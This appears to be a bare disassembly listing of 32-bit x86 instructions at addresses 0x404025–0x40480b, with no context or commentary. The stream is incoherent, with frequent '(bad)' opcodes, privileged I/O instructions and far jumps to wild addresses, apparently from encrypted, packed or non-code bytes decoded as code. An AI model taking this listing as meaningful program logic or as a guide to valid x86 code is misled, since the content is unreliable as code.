  404025:	arpl   WORD PTR [ebp+0xc],dx
  404028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404029:	pop    ds
  40402a:	mov    esp,0x34d7419f
  40402f:	test   DWORD PTR [edx+0x79],0x3be364ac
  404036:	imul   ecx,edi,0xffffffdc
  404039:	je     0x403fcb
  40403b:	or     BYTE PTR [edi+0x1d746b49],0xee
  404042:	pop    ebx
  404043:	inc    ecx
  404044:	jne    0x40405f
  404046:	mov    esi,0x470d433c
  40404b:	jae    0x404041
  40404d:	xchg   ebx,eax
  40404e:	push   ecx
  40404f:	and    ebp,DWORD PTR ds:0x7682c06e
  404055:	add    edx,DWORD PTR [edx-0x324dd98e]
  40405b:	mov    bl,0x3d
  40405d:	inc    edx
  40405e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40405f:	lods   al,BYTE PTR ds:[esi]
  404060:	or     eax,0xe62576ea
  404065:	push   DWORD PTR [ebx-0x3]
  404068:	mov    cs,WORD PTR [eax]
  40406a:	rcl    BYTE PTR [eax-0x24],0xcb
  40406e:	aad    0x31
  404070:	push   edi
  404071:	mov    esi,0xdf5a57df
  404076:	clc    
  404077:	jle    0x40405e
  404079:	jo     0x4040c5
  40407b:	and    eax,0x4c4d400b
  404080:	fsub   st,st(7)
  404082:	test   al,0xf4
  404084:	sbb    BYTE PTR [ebx+0x7807ecb3],bh
  40408a:	mov    edx,0xd728d9b3
  40408f:	pushf  
  404090:	mov    ch,0x5b
  404092:	addr16 enter 0x55e7,0x56
  404097:	mov    edi,esp
  404099:	push   eax
  40409a:	sub    al,0xcf
  40409c:	push   edi
  40409d:	and    al,0xe5
  40409f:	(bad)  
  4040a1:	sbb    cl,BYTE PTR [edi+0x5d]
  4040a4:	aaa    
  4040a5:	mov    BYTE PTR [eax-0x64],ch
  4040a8:	dec    eax
  4040a9:	sbb    eax,0x13caa615
  4040ae:	inc    eax
  4040af:	push   ebx
  4040b0:	jnp    0x404084
  4040b2:	(bad)  
  4040b3:	inc    eax
  4040b4:	jnp    0x4040c0
  4040b6:	aad    0xe
  4040b8:	test   DWORD PTR [ebx+0x7b390cc5],ebp
  4040be:	call   0xb416:0x807d2658
  4040c5:	ins    BYTE PTR es:[edi],dx
  4040c6:	xchg   bl,dl
  4040c8:	push   edi
  4040c9:	pop    ss
  4040ca:	out    dx,al
  4040cb:	pop    eax
  4040cc:	test   DWORD PTR [ecx-0x30],eax
  4040cf:	dec    edx
  4040d0:	add    eax,0x5d44d9c
  4040d5:	xlat   BYTE PTR ds:[ebx]
  4040d6:	lahf   
  4040d7:	imul   ebx,ecx,0x3c7465c
  4040dd:	or     eax,ebx
  4040df:	cwde   
  4040e0:	out    dx,eax
  4040e1:	or     edx,DWORD PTR [edx-0x4297a7d]
  4040e7:	lods   eax,DWORD PTR ds:[esi]
  4040e8:	aam    0x45
  4040ea:	push   ecx
  4040eb:	push   cs
  4040ec:	scas   eax,DWORD PTR es:[edi]
  4040ed:	scas   eax,DWORD PTR es:[edi]
  4040ee:	aas    
  4040ef:	inc    edi
  4040f0:	neg    DWORD PTR [ebp+eax*4+0x3f]
  4040f4:	adc    ebp,0x70
  4040f7:	push   ds
  4040f8:	shr    esi,cl
  4040fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040fb:	imul   edi,esp,0x456ffb5f
  404101:	and    ch,BYTE PTR [edx]
  404103:	ins    BYTE PTR es:[edi],dx
  404104:	mov    WORD PTR [ebp+0x7],ds
  404107:	jl     0x40415b
  404109:	jmp    0x40409c
  40410b:	push   cs
  40410c:	add    BYTE PTR [eax+0x6e],0x4b
  404110:	jbe    0x404111
  404112:	fdivr  st(1),st
  404114:	xor    al,0xaa
  404116:	xchg   ebp,eax
  404117:	add    edi,esi
  404119:	outs   dx,BYTE PTR ds:[esi]
  40411a:	xor    ebp,edi
  40411c:	jno    0x4040e4
  40411e:	sub    bl,BYTE PTR [esi-0x23]
  404121:	mov    eax,0x39cc982a
  404126:	(bad)  
  404127:	jmp    0x49ca:0x837a2b7b
  40412e:	jp     0x40410d
  404130:	pushf  
  404131:	inc    edi
  404132:	sbb    esp,DWORD PTR [ecx]
  404134:	sub    BYTE PTR [esi+ebp*4+0x10],dl
  404138:	sub    BYTE PTR [esp+esi*4-0x65cdf99c],bh
  40413f:	pop    edi
  404140:	mov    al,ds:0x1ab7e8cf
  404145:	or     eax,0x792186ed
  40414a:	cmp    al,0x7
  40414c:	sub    ah,dh
  40414e:	call   0xe181:0x7e3e453
  404155:	les    ebp,FWORD PTR [ecx-0x448c33e4]
  40415b:	test   DWORD PTR [edi-0x4c6b419c],esp
  404161:	sub    al,BYTE PTR [edi]
  404163:	div    DWORD PTR [eax+edi*2+0xd]
  404167:	push   edi
  404168:	pop    esp
  404169:	imul   eax,DWORD PTR [ecx],0xf7f941a1
  40416f:	fdivr  st,st(2)
  404171:	push   ss
  404172:	and    BYTE PTR [ecx],ah
  404174:	aam    0xd
  404176:	or     al,0x66
  404178:	repnz or BYTE PTR [eax-0x47],al
  40417c:	icebp  
  40417d:	xor    eax,0x5cc38046
  404182:	fwait
  404183:	loope  0x404178
  404185:	mov    eax,0x5a013326
  40418a:	jb     0x4041f7
  40418c:	lods   al,BYTE PTR ds:[esi]
  40418d:	icebp  
  40418e:	iret   
  40418f:	mov    ebx,0x5f5ea32a
  404194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404195:	(bad)  
  404196:	fidiv  WORD PTR [ebp+ebp*2-0x6857b30a]
  40419d:	xchg   DWORD PTR [edi],ebx
  40419f:	push   ds
  4041a0:	loopne 0x404142
  4041a2:	mov    edi,0x4ee72402
  4041a7:	add    BYTE PTR [ebx+0x20],ah
  4041aa:	sbb    eax,0xff246ba6
  4041af:	pop    ecx
  4041b0:	mov    edx,0xfc639d20
  4041b5:	jb     0x404217
  4041b7:	mov    DWORD PTR [esp+edx*8-0x6b],0xb19b4ba1
  4041bf:	cli    
  4041c0:	call   0x8620f243
  4041c5:	sbb    DWORD PTR ds:0xc6e4072,0x46
  4041cc:	shl    BYTE PTR [ecx+ebx*8+0x2cd499e6],0xb0
  4041d4:	rcl    DWORD PTR [ecx],0x94
  4041d7:	xchg   DWORD PTR [ebx-0x7a9ce78b],ebx
  4041dd:	mov    esi,0x7953c752
  4041e2:	dec    ebx
  4041e3:	cwde   
  4041e4:	jne    0x404175
  4041e6:	sbb    DWORD PTR [ebx-0x4d94f956],esi
  4041ec:	mov    edi,0x8ddb9835
  4041f1:	inc    DWORD PTR [edi]
  4041f3:	mov    al,BYTE PTR [eax-0xe8ce56a]
  4041f9:	adc    ch,bl
  4041fb:	inc    eax
  4041fc:	push   ebx
  4041fd:	rol    DWORD PTR [ebx+0x5377d978],0xae
  404204:	neg    BYTE PTR [esi]
  404206:	in     eax,0xbf
  404208:	fstp   DWORD PTR [edx]
  40420a:	inc    edx
  40420b:	jle    0x404255
  40420d:	add    DWORD PTR [esi-0x23c1d68f],ebp
  404213:	push   0xffffff8b
  404215:	inc    ebx
  404216:	mov    ds:0x3964185a,eax
  40421b:	sbb    al,0x9d
  40421d:	add    al,0x55
  40421f:	jge    0x404240
  404221:	mov    bl,0x70
  404223:	ja     0x4041ca
  404225:	inc    esi
  404226:	inc    esi
  404227:	in     eax,dx
  404228:	sub    al,0x83
  40422a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40422b:	mov    ebx,DWORD PTR [ebx-0x9]
  40422e:	inc    edi
  40422f:	test   BYTE PTR [esi],cl
  404231:	or     al,BYTE PTR [ebx+ebp*2+0x2]
  404235:	int    0xf0
  404237:	xlat   BYTE PTR ds:[ebx]
  404238:	dec    ecx
  404239:	pusha  
  40423a:	je     0x40426f
  40423c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40423d:	sbb    al,0x83
  40423f:	inc    edx
  404240:	mov    esi,0xbcabc5f
  404245:	and    DWORD PTR [eax],esi
  404247:	(bad)  
  404249:	in     al,0x20
  40424b:	or     DWORD PTR [esi],ebx
  40424d:	das    
  40424e:	rcl    BYTE PTR [eax+0x486c1d84],0xa2
  404255:	adc    eax,0x1fab11e7
  40425a:	add    edi,ebx
  40425c:	mov    al,ds:0xf51c22fa
  404261:	mov    dh,0x5c
  404263:	shl    BYTE PTR [eax+esi*8],cl
  404266:	jno    0x4041ed
  404268:	ficom  DWORD PTR [edx-0x2a]
  40426b:	(bad)  
  40426c:	icebp  
  40426d:	pop    esp
  40426e:	push   ebp
  40426f:	add    edi,ebp
  404271:	fimul  DWORD PTR [eax]
  404273:	in     al,dx
  404274:	mov    dl,0x1b
  404276:	into   
  404277:	push   0xcfc69593
  40427c:	xor    eax,0xedae752
  404281:	pop    esp
  404282:	int3   
  404283:	jmp    0x404277
  404285:	mov    eax,0x9a2c7bf0
  40428a:	lds    edx,FWORD PTR [eax-0x4c793646]
  404290:	xchg   ah,dl
  404292:	jne    0x4042e2
  404294:	jae    0x404255
  404296:	mov    esi,0x54c02925
  40429b:	push   0x6a5063a
  4042a0:	sub    dh,al
  4042a2:	pop    eax
  4042a3:	(bad)  
  4042a4:	enter  0x72ea,0x92
  4042a8:	js     0x40425f
  4042aa:	mov    esi,ecx
  4042ac:	or     ebx,DWORD PTR [ebx]
  4042ae:	test   BYTE PTR [edi-0x50],al
  4042b1:	cmp    eax,0x70306fbe
  4042b6:	sbb    al,bh
  4042b8:	icebp  
  4042b9:	xor    BYTE PTR [edx+0x6f],0x5
  4042bd:	test   ecx,0x7f4bbb5e
  4042c3:	scas   al,BYTE PTR es:[edi]
  4042c4:	pop    ds
  4042c5:	inc    ebp
  4042c6:	pop    eax
  4042c7:	xchg   bl,dh
  4042c9:	jb     0x404297
  4042cb:	ret    0x7c91
  4042ce:	fstp   DWORD PTR [ebx]
  4042d0:	daa    
  4042d1:	pop    edx
  4042d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d3:	mov    ds:0x7392f163,eax
  4042d8:	dec    ebp
  4042d9:	test   eax,0x2f80f7a
  4042de:	loop   0x40428e
  4042e0:	jl     0x4042ec
  4042e2:	pop    edx
  4042e3:	jne    0x4042dc
  4042e5:	aas    
  4042e6:	mov    ds:0x99969c13,eax
  4042eb:	popf   
  4042ec:	jmp    DWORD PTR [edx-0x7c9a1afc]
  4042f2:	add    eax,0xd700e1c6
  4042f7:	rol    cl,1
  4042f9:	mov    WORD PTR [edx],fs
  4042fb:	xor    al,0xce
  4042fd:	gs and eax,0xe039038e
  404303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404304:	shl    DWORD PTR [ebp-0x5e],cl
  404307:	int    0xf7
  404309:	adc    edi,DWORD PTR [ebx+0xcf0c24b]
  40430f:	mov    al,0xae
  404311:	mov    ah,ah
  404313:	(bad)  
  404314:	jmp    0x40436d
  404316:	push   cs
  404317:	add    DWORD PTR [ebx+0x12],ecx
  40431a:	adc    al,0x17
  40431c:	mov    ah,0x21
  40431e:	mov    esp,0xc3fc2688
  404323:	pop    ecx
  404324:	adc    BYTE PTR [ecx-0x2f299ab2],dh
  40432a:	pop    edi
  40432b:	stos   BYTE PTR es:[edi],al
  40432c:	cmp    eax,DWORD PTR [ebx+0x7966f9e3]
  404332:	jge    0x4043b3
  404334:	sub    al,0xf0
  404336:	xchg   esi,eax
  404337:	clc    
  404338:	adc    dh,0x5b
  40433b:	ins    DWORD PTR es:[edi],dx
  40433c:	jecxz  0x4042f0
  40433e:	jge    0x4042fd
  404340:	or     eax,0x1f7aa03d
  404345:	jno    0x40434a
  404347:	and    edi,DWORD PTR [ebx+0x35bd3657]
  40434d:	push   ds
  40434e:	fild   WORD PTR [esi]
  404350:	push   edi
  404351:	ret    
  404352:	lea    esi,[eax+0x39]
  404355:	stos   BYTE PTR es:[edi],al
  404356:	nop
  404357:	mov    ah,0x7b
  404359:	(bad)  
  40435a:	mov    esi,0xf9a08222
  40435f:	(bad)  
  404360:	mov    ebp,0x3db01a1a
  404365:	jns    0x40437a
  404367:	sbb    ebp,ebx
  404369:	inc    edi
  40436a:	div    DWORD PTR ds:0x2b34c1dd
  404370:	repz adc BYTE PTR [ecx-0x232bb668],cl
  404377:	sahf   
  404378:	add    BYTE PTR [ebx-0x27bec21d],bl
  40437e:	je     0x404301
  404380:	xchg   edx,eax
  404381:	mov    ch,BYTE PTR [edi-0x458db19d]
  404387:	fs xor esp,esp
  40438a:	sub    edx,DWORD PTR [ebx+0x54213600]
  404390:	and    ecx,DWORD PTR [edi+0x60]
  404393:	int    0x19
  404395:	cdq    
  404396:	imul   ebp,DWORD PTR [ebp+0x6b46d62a],0x437e14f3
  4043a0:	retf   0xf33b
  4043a3:	pop    ecx
  4043a4:	stc    
  4043a5:	mov    ebp,0x5b0d6da8
  4043aa:	loopne 0x404421
  4043ac:	mov    edx,0xc4cdd2a7
  4043b1:	push   0x232ab24c
  4043b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b7:	cmp    esp,DWORD PTR [ebp+edi*4-0x41]
  4043bb:	aas    
  4043bc:	test   DWORD PTR [eax+0x6c],esi
  4043bf:	sub    al,0xd6
  4043c1:	jl     0x40440b
  4043c3:	jbe    0x4043de
  4043c5:	xor    al,0xff
  4043c7:	mov    esp,0x5c8b1cb0
  4043cc:	push   ss
  4043cd:	cs jl  0x404394
  4043d0:	dec    edi
  4043d1:	mov    al,0xab
  4043d3:	out    0xe1,al
  4043d5:	add    ah,bl
  4043d7:	outs   dx,BYTE PTR ds:[esi]
  4043d8:	sbb    al,ah
  4043da:	inc    esi
  4043db:	dec    esi
  4043dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043dd:	jnp    0x404432
  4043df:	shr    BYTE PTR [edi+0x70],cl
  4043e2:	cmp    dh,BYTE PTR [ecx-0x1d]
  4043e5:	sbb    BYTE PTR [ebx-0x1],al
  4043e8:	lods   eax,DWORD PTR ds:[esi]
  4043e9:	adc    esi,DWORD PTR [ecx]
  4043eb:	jg     0x4043af
  4043ed:	inc    eax
  4043ee:	mov    al,0xeb
  4043f0:	loopne 0x404428
  4043f2:	xor    esp,edx
  4043f4:	mov    bh,0xf
  4043f6:	arpl   WORD PTR ds:0x47143b2,bx
  4043fc:	das    
  4043fd:	aas    
  4043fe:	clc    
  4043ff:	aas    
  404400:	call   0xdca1206d
  404405:	sub    dl,cl
  404407:	xor    DWORD PTR [ecx],edx
  404409:	mov    BYTE PTR [edx+ebp*4-0x26],ch
  40440d:	fimul  DWORD PTR [eax+0x1c]
  404410:	pop    ebp
  404411:	xchg   edi,eax
  404412:	leave  
  404413:	push   ds
  404414:	push   es
  404415:	js     0x4043c2
  404417:	in     eax,0xa8
  404419:	in     eax,0xa8
  40441b:	mov    ecx,DWORD PTR [ecx+0x4d]
  40441e:	out    dx,al
  40441f:	mov    fs,WORD PTR [eax]
  404421:	sbb    eax,DWORD PTR [ebx]
  404423:	xlat   BYTE PTR ds:[ebx]
  404424:	icebp  
  404425:	outs   dx,DWORD PTR ds:[esi]
  404426:	test   ebp,esi
  404428:	fistp  WORD PTR [edi+edi*8]
  40442b:	icebp  
  40442c:	mov    dl,BYTE PTR [esi+0x3e]
  40442f:	stos   DWORD PTR es:[edi],eax
  404430:	mov    edx,DWORD PTR [ebx-0x6d2bd34f]
  404436:	add    bl,ch
  404438:	scas   al,BYTE PTR es:[edi]
  404439:	dec    edi
  40443a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443b:	push   0xa00d5243
  404440:	stos   DWORD PTR es:[edi],eax
  404441:	das    
  404442:	add    esp,DWORD PTR [edi+eax*2]
  404445:	xchg   edi,eax
  404446:	jg     0x4043f6
  404448:	call   0x5591c5a7
  40444d:	inc    edx
  40444e:	jae    0x40444c
  404450:	xor    eax,0x723d790b
  404455:	mov    ch,0x30
  404457:	sar    BYTE PTR [edi],0x15
  40445a:	mov    ebx,0x841afc43
  40445f:	cwde   
  404460:	push   ds
  404461:	pop    ebp
  404462:	cmp    BYTE PTR [ecx+0x7],dh
  404465:	pop    ss
  404466:	inc    ebp
  404467:	out    0x19,eax
  404469:	sub    DWORD PTR [edx-0xde0c5d2],0x6920d809
  404473:	ror    DWORD PTR [ecx-0x7d],1
  404476:	hlt    
  404477:	or     ebx,ecx
  404479:	adc    DWORD PTR [ebp+0x70b603f],0x5d
  404480:	xlat   BYTE PTR ds:[ebx]
  404481:	out    dx,al
  404482:	xlat   BYTE PTR ds:[ebx]
  404483:	pop    ds
  404484:	pop    es
  404485:	jo     0x4044bb
  404487:	sub    al,0xe9
  404489:	cmp    BYTE PTR [esi+eax*2+0x5c],ah
  40448d:	jecxz  0x4044f3
  40448f:	sub    al,ah
  404491:	test   eax,0x60d208bf
  404496:	add    eax,0xd1d59522
  40449b:	dec    DWORD PTR [edx+ecx*4+0x5f5a78db]
  4044a2:	es lahf 
  4044a4:	jbe    0x404469
  4044a6:	add    DWORD PTR [ecx],edx
  4044a8:	mov    bl,BYTE PTR [esi+0x51]
  4044ab:	xchg   ebp,eax
  4044ac:	fwait
  4044ad:	cwde   
  4044ae:	das    
  4044af:	in     al,0x38
  4044b1:	into   
  4044b2:	test   DWORD PTR [ebx],ebp
  4044b4:	cmp    BYTE PTR [ecx],0x8b
  4044b7:	or     BYTE PTR [esi],dl
  4044b9:	jae    0x40451e
  4044bb:	jmp    0x6a063ab3
  4044c0:	hlt    
  4044c1:	or     DWORD PTR [ebx-0x6a],eax
  4044c4:	inc    edi
  4044c5:	sub    DWORD PTR [edi-0x6cb066f],ebx
  4044cb:	sar    bh,0xa
  4044ce:	popa   
  4044cf:	pop    ebp
  4044d0:	mov    al,0x63
  4044d2:	pop    es
  4044d3:	dec    ecx
  4044d4:	or     al,0x34
  4044d6:	jae    0x40446f
  4044d8:	pop    esi
  4044d9:	sub    DWORD PTR [edi-0x1e],edx
  4044dc:	adc    DWORD PTR [edi],ebx
  4044de:	xor    ecx,edi
  4044e0:	mov    bl,BYTE PTR [ebx]
  4044e2:	sahf   
  4044e3:	or     ebp,ebp
  4044e5:	retf   
  4044e6:	je     0x40449a
  4044e8:	aaa    
  4044e9:	or     dl,BYTE PTR [ebx-0x583fd98e]
  4044ef:	push   ebp
  4044f0:	push   esi
  4044f1:	or     eax,0x28b2475a
  4044f6:	pushf  
  4044f7:	rcl    BYTE PTR [esi-0x7d906d27],cl
  4044fd:	sbb    eax,0xcbdf54f0
  404502:	mov    ds:0xa02cca5d,al
  404507:	xabort 0xf1
  40450a:	mov    cl,0xe9
  40450c:	popa   
  40450d:	add    bh,bl
  40450f:	jmp    0x42fddf56
  404514:	mov    fs,WORD PTR [esi+0x1308a203]
  40451a:	adc    ecx,DWORD PTR [ecx-0x26c1d099]
  404520:	and    ah,BYTE PTR [eax]
  404522:	mov    ah,0xe6
  404524:	xchg   esi,eax
  404525:	js     0x40453d
  404527:	cmp    eax,0x188ac02
  40452c:	aas    
  40452d:	cli    
  40452e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40452f:	daa    
  404530:	lock (bad) 
  404532:	xor    esi,DWORD PTR [ecx+edi*8]
  404535:	sub    BYTE PTR [ebx+eiz*1-0x8be4fa9],bl
  40453c:	push   ss
  40453d:	int    0x78
  40453f:	cmp    al,0x77
  404541:	in     eax,0xc9
  404543:	rol    edi,1
  404545:	imul   esp,DWORD PTR [edx-0x66f69357],0xffffff99
  40454c:	jno    0x4044fa
  40454e:	ret    0x244d
  404551:	je     0x404583
  404553:	sub    eax,0x7e553b7a
  404558:	jg     0x404598
  40455a:	push   ds
  40455b:	adc    eax,0x232bd909
  404560:	call   0xce79:0x6a8a67f2
  404567:	ror    DWORD PTR [edx],1
  404569:	jle    0x4045d7
  40456b:	out    dx,eax
  40456c:	sbb    DWORD PTR [ecx-0x12],eax
  40456f:	stos   DWORD PTR es:[edi],eax
  404570:	dec    ecx
  404571:	inc    esp
  404572:	jmp    0x10b:0xbfb6303d
  404579:	dec    esi
  40457a:	xchg   ebp,eax
  40457b:	mov    ecx,0xa1b1df83
  404580:	test   al,0x86
  404582:	sub    eax,0xfa7e5f79
  404587:	cwde   
  404588:	dec    edi
  404589:	push   edi
  40458a:	pop    ds
  40458b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40458c:	rcr    esi,1
  40458e:	ret    0xbb29
  404591:	ror    BYTE PTR [edx+edx*4],cl
  404594:	xchg   ebx,eax
  404595:	adc    DWORD PTR [edi+0x4],edx
  404598:	repnz push es
  40459a:	in     al,0x7d
  40459c:	das    
  40459d:	dec    eax
  40459e:	shl    DWORD PTR [ebx-0x7e],0xb9
  4045a2:	and    dh,BYTE PTR [ebp+0x16]
  4045a5:	rol    BYTE PTR ds:0x1f2dd622,1
  4045ab:	mov    ds,WORD PTR [ecx-0x32027b58]
  4045b1:	sub    DWORD PTR [edi-0x3f],edx
  4045b4:	retf   0xa68d
  4045b7:	sbb    BYTE PTR [eax],dl
  4045b9:	imul   ebp,DWORD PTR [edx-0x1],0x4f56036c
  4045c0:	mov    al,ds:0x9e6f51e2
  4045c5:	or     eax,0x4f6af1a2
  4045ca:	cmp    dl,BYTE PTR [esi+0x2adbbc99]
  4045d0:	mov    ebp,0xdcae957
  4045d5:	xor    eax,0xd4ecae20
  4045da:	sub    BYTE PTR [esi+0x4],dh
  4045dd:	repz add DWORD PTR [eax+0x388a87fd],ebp
  4045e4:	mov    ds,WORD PTR [edx-0x4a]
  4045e7:	lahf   
  4045e8:	inc    ebp
  4045e9:	cmp    BYTE PTR [edx+0x4420bb09],ch
  4045ef:	mov    eax,ds:0xb9c78806
  4045f4:	outs   dx,BYTE PTR ds:[esi]
  4045f5:	pop    ebp
  4045f6:	stc    
  4045f7:	mov    BYTE PTR [edi+0x41],dl
  4045fa:	ror    BYTE PTR [edx+0x2d],0x37
  4045fe:	xor    ebp,DWORD PTR [eax-0x75c5bc0]
  404604:	and    DWORD PTR [esi],ecx
  404606:	pop    ebp
  404607:	xchg   BYTE PTR [edi],ch
  404609:	ret    0x757f
  40460c:	daa    
  40460d:	imul   ecx,ebx,0xffffff9e
  404610:	fs jns 0x404659
  404613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404614:	xor    DWORD PTR [edx],edi
  404616:	dec    edx
  404617:	push   cs
  404618:	(bad)  
  404619:	jno    0x40463f
  40461b:	jnp    0x4045f3
  40461d:	jmp    0x5930730c
  404622:	mov    es,WORD PTR [ebx-0x1d]
  404625:	push   ss
  404626:	jae    0x40467e
  404628:	ja     0x40463a
  40462a:	xor    DWORD PTR [esi-0x63],0xf75bf459
  404631:	lods   al,BYTE PTR ds:[esi]
  404632:	mov    ds:0x34a1b82a,eax
  404637:	cmp    al,BYTE PTR [esi+0x7b]
  40463a:	and    eax,0xafdfa7e5
  40463f:	mov    ds:0xdb5a8c04,eax
  404644:	pop    esp
  404645:	pop    esp
  404646:	aas    
  404647:	in     eax,dx
  404648:	push   es
  404649:	dec    ebx
  40464a:	jae    0x4046c0
  40464c:	dec    eax
  40464d:	das    
  40464e:	xor    ebp,ebp
  404650:	aas    
  404651:	mov    al,0xd0
  404653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404654:	sbb    edx,ebp
  404656:	cmp    esi,0x4b571fbb
  40465c:	add    BYTE PTR [eax],0x5b
  40465f:	and    bl,BYTE PTR [edx]
  404661:	jo     0x404641
  404663:	sub    DWORD PTR [eax-0x12],eax
  404666:	mov    BYTE PTR [ebx+edx*2+0x4486e54e],ch
  40466d:	mov    eax,ds:0xfa55372c
  404672:	push   edx
  404673:	jg     0x404664
  404675:	in     al,0xdb
  404677:	pop    ecx
  404678:	jns    0x4046c8
  40467a:	sbb    ebp,DWORD PTR [edi+0x15]
  40467d:	cli    
  40467e:	jb     0x404678
  404680:	fnstsw WORD PTR [ebp+0x39]
  404683:	xlat   BYTE PTR ds:[ebx]
  404684:	retf   0x9885
  404687:	push   esi
  404688:	(bad)  
  404689:	fcom   st(0)
  40468b:	mov    ebp,0xaf1e6f93
  404690:	jmp    0xef9a155e
  404695:	ss std 
  404697:	loop   0x4046f0
  404699:	scas   eax,DWORD PTR es:[edi]
  40469a:	jge    0x4046f2
  40469c:	aaa    
  40469d:	mul    eax
  40469f:	xchg   ebp,esi
  4046a1:	fbstp  TBYTE PTR [eax+0x16]
  4046a4:	lods   al,BYTE PTR ds:[esi]
  4046a5:	pop    ecx
  4046a6:	addr16 nop
  4046a8:	popa   
  4046a9:	cdq    
  4046aa:	jge    0x40464a
  4046ac:	hlt    
  4046ad:	ret    0x58e4
  4046b0:	pop    ebp
  4046b1:	ja     0x4046c3
  4046b3:	int    0x44
  4046b5:	test   eax,0xf695d49f
  4046ba:	jne    0x404737
  4046bc:	pop    eax
  4046bd:	cmp    al,0x82
  4046bf:	js     0x4046b9
  4046c1:	xchg   ebx,eax
  4046c2:	dec    eax
  4046c3:	pop    es
  4046c4:	inc    edx
  4046c5:	inc    ebp
  4046c6:	ss cld 
  4046c8:	fmul   DWORD PTR [edi-0x47d42388]
  4046ce:	cmp    bl,al
  4046d0:	sbb    BYTE PTR [eax+ebp*8+0x33],0x67
  4046d5:	std    
  4046d6:	mov    ds:0xad427ea7,al
  4046db:	push   ebp
  4046dc:	pop    ss
  4046dd:	loopne 0x404758
  4046df:	adc    cl,ah
  4046e1:	mov    dl,0xbf
  4046e3:	retf   
  4046e4:	cmp    dl,BYTE PTR [ebx+0x6a]
  4046e7:	fadd   QWORD PTR [edx+0x40]
  4046ea:	cwde   
  4046eb:	adc    eax,0xbdc8bf61
  4046f0:	(bad)  
  4046f1:	les    ebp,FWORD PTR [edx]
  4046f3:	in     al,0x6f
  4046f5:	push   gs
  4046f7:	and    BYTE PTR [eax+0x68195062],ah
  4046fd:	fcom   DWORD PTR [ebx+0x33]
  404700:	iret   
  404701:	pushf  
  404702:	xchg   esp,eax
  404703:	add    cl,al
  404705:	mov    edx,0x367edec7
  40470a:	scas   al,BYTE PTR es:[edi]
  40470b:	xchg   edi,ebp
  40470d:	(bad)  
  40470e:	out    0xdf,al
  404710:	out    dx,al
  404711:	xchg   edi,eax
  404712:	pusha  
  404713:	jg     0x404723
  404715:	retf   
  404716:	sbb    al,0xe9
  404718:	fcomp  QWORD PTR [ebx-0x117b8999]
  40471e:	pop    eax
  40471f:	mov    ds:0x5ed2a68d,eax
  404724:	adc    eax,0x1a489286
  404729:	leave  
  40472a:	adc    esi,esp
  40472c:	mov    edx,0xb0ab9c02
  404731:	mov    ebp,DWORD PTR [ebx-0x36]
  404734:	test   edx,0x30e32a09
  40473a:	cmp    eax,0x4df5025e
  40473f:	adc    al,0xef
  404741:	imul   ecx,DWORD PTR [edx],0x6
  404744:	lods   al,BYTE PTR ds:[esi]
  404745:	ficomp WORD PTR [edx]
  404747:	sbb    bl,BYTE PTR [edi+0x1b3d2600]
  40474d:	pushf  
  40474e:	jecxz  0x404710
  404750:	mov    al,gs:0xe39bb9be
  404756:	mov    al,ds:0xca9b377e
  40475b:	fldenv [edi+eax*4-0x76ff2d73]
  404762:	and    BYTE PTR [esi-0x4a],cl
  404765:	pop    edx
  404766:	push   edi
  404767:	xor    DWORD PTR [ebx-0x7cc76661],0x8
  40476e:	xor    eax,0xc16d9092
  404773:	and    al,0xa9
  404775:	mov    bl,BYTE PTR [edx]
  404777:	inc    esi
  404778:	pop    ss
  404779:	pushf  
  40477a:	lock nop/reserved BYTE PTR [ecx-0x7]
  40477f:	jl     0x40477a
  404781:	dec    edi
  404782:	clc    
  404783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404784:	mov    BYTE PTR [eax+0x2c60cf5b],al
  40478a:	ret    0x6386
  40478d:	inc    esp
  40478e:	lahf   
  40478f:	stc    
  404790:	cmc    
  404791:	popa   
  404792:	(bad)  [ebp-0x64]
  404795:	lahf   
  404796:	mov    esp,DWORD PTR [edx+ebx*1-0x72]
  40479a:	(bad)  
  40479b:	jecxz  0x4047d5
  40479d:	imul   esi,DWORD PTR [edx],0x8e8ff556
  4047a3:	popa   
  4047a4:	pop    edi
  4047a5:	push   esp
  4047a6:	xor    ebp,esp
  4047a8:	mov    ds:0xa1bb7a4,eax
  4047ad:	(bad)  
  4047af:	dec    ebp
  4047b0:	shr    BYTE PTR [ecx+0x23],1
  4047b3:	sub    al,BYTE PTR [eax]
  4047b5:	inc    edx
  4047b6:	loopne 0x404783
  4047b8:	leave  
  4047b9:	pop    esi
  4047ba:	push   cs
  4047bb:	jl     0x40481f
  4047bd:	mov    esi,0x6e98484d
  4047c2:	ja     0x40474b
  4047c4:	push   esi
  4047c5:	cmp    esi,ecx
  4047c7:	or     DWORD PTR [ebx+eax*8+0x719396d2],ecx
  4047ce:	xchg   edi,eax
  4047cf:	cdq    
  4047d0:	and    BYTE PTR [ecx],al
  4047d2:	fidivr DWORD PTR [ecx+0x33aaaf13]
  4047d8:	mov    edx,0xbfdc8a33
  4047dd:	mov    edi,0xe5e22ab4
  4047e2:	and    BYTE PTR [eax],bl
  4047e4:	jmp    0x4047e6
  4047e6:	fcmovnu st,st(7)
  4047e8:	inc    esp
  4047e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ea:	jecxz  0x404789
  4047ec:	xchg   ebp,eax
  4047ed:	not    DWORD PTR [ecx-0x4d9ac558]
  4047f3:	loopne 0x4047b0
  4047f5:	add    BYTE PTR [edx+0x6320ae61],ah
  4047fb:	retf   0xa6e
  4047fe:	or     DWORD PTR [eax],esi
  404800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404801:	fidivr DWORD PTR ds:0x1ecacfdf
  404807:	out    0x92,al
  404809:	mov    al,0x41
  40480b:	dec    edi
